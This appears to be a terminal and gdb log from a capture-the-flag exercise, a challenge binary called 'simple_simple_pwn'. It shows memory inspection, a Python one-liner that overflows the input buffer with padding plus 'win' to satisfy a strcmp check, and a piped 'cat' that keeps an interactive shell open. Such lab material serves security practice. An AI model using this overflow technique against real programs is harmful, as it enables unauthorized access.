```
0x7fffffffe130:    0x41414141

input buffer is at 0x7fffffffe130
but strcmp, compars with 140
(gdb) x/s $rax
0x7fffffffe140:    ""


0x7fffffffe130:    0x41414141    0x00000000    0x00000000    0x00000000
0x7fffffffe140:    0x00000000    0x00000000    0x00000000    0x00000000

(gdb) r <<< $(python -c 'print ("\x90" * 8 + "win")')

$ (python -c 'print ("\x90" * 8 + "win")'; cat ) | ./simple_simple_pwn
Welcome to simple_simple_pwn!
Because simple pwn was considered hard, we decided to make it harder.
You win!
pwd
/home/kali/Desktop
```